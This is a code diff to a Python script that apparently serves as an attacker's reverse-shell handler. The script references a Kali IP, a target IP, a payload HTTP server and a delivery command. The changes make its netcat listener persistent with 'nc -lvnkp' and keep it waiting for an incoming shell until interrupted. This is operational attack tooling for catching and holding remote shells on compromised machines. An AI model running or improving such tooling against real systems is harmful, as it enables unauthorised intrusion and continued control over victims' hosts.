@@ -142,16 +142,17 @@ def start_http_server(port=8080):
     return False
 
 def start_listener(port):
-    """Start nc listener"""
+    """Start nc listener - keeps running after connection drops"""
     _log(f"Starting listener on :{port}")
+    # Use -k flag to keep listening after connection closes
     proc = subprocess.Popen(
-        ["nc", "-lvnp", str(port)],
+        ["nc", "-lvnkp", str(port)],
         stdin=sys.stdin,
         stdout=sys.stdout,
         stderr=sys.stderr
     )
     processes.append(proc)
-    _log(f"Listener ready on port {port}", "!")
+    _log(f"Listener ready on port {port} (persistent)", "!")
     return proc
 
 def show_delivery_command(kali_ip, http_port, target_ip=""):
@@ -315,7 +316,12 @@ def main():
     print()
 
     listener = start_listener(port)
-    listener.wait()
+    
+    _log("Waiting for shell - press Ctrl+C to stop", "!")
+    try:
+        listener.wait()
+    except KeyboardInterrupt:
+        pass
 
     _log("Session ended")
     cleanup()
